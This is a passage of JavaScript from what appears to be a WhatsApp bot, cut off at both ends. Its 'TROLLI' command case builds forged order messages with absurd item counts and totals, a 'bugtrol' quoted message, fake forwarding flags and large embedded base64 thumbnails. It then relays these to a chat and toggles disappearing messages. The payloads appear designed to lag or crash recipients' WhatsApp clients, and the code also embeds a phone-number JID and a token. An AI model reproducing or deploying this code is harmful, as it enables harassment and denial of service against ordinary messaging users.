							"thumbnail": "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",
							"itemCount": 1000000000000,
							"status": "INQUIRY",
							"surface": "CATALOG",
							"orderTitle": "GUA GK NGERTI",
							"message": "entah lah gua nob",
							"sellerJid": "6288224859350@s.whatsapp.net",
							"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
							"totalAmount1000": "99999999999999999999",
							"totalCurrencyCode": "IDR",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: bugtrol,
						contextInfo: {}
					})

			Maslent
				.toggleDisappearingMessages(
					from,
					'Awoakwoakwoak'
				)
			Maslent
				.relayWAMessage(
					res)
			break
		case 'p': // TROLLI
			buf = Mfake
			imeu = await Maslent
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await Maslent
				.prepareMessageFromContent(
					from, {
						"orderMessage": {
							"orderId": "150453297177375",
							"thumbnail": "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